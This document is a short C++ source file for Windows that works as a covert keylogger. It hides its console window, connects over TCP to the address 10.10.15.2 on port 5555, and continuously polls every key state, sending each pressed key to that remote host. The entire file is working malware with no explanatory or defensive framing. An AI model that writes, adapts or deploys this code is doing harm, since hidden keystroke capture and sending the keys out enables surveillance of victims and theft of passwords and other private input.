#define _WINSOCK_DEPRECATED_NO_WARNINGS
#pragma comment(lib, "Ws2_32.lib")
#include <iostream>
#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>

int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    char KEY;

    WSADATA WSAData;
    SOCKET server;
    SOCKADDR_IN addr;

    WSAStartup(MAKEWORD(2, 0), &WSAData);
    server = socket(AF_INET, SOCK_STREAM, 0);

    addr.sin_addr.s_addr = inet_addr("10.10.15.2");
    addr.sin_family = AF_INET;
    addr.sin_port = htons(5555);

    connect(server, (SOCKADDR *)&addr, sizeof(addr));

    while (true) {
        Sleep(10);
        for (int KEY = 0x8; KEY < 0xFF; KEY++)
        {
            if (GetAsyncKeyState(KEY) & 0x8000) {
                char buffer[2];
                buffer[0] = KEY;
                send(server, buffer, sizeof(buffer), 0);
            }
        }
    }

    closesocket(server);
    WSACleanup();
}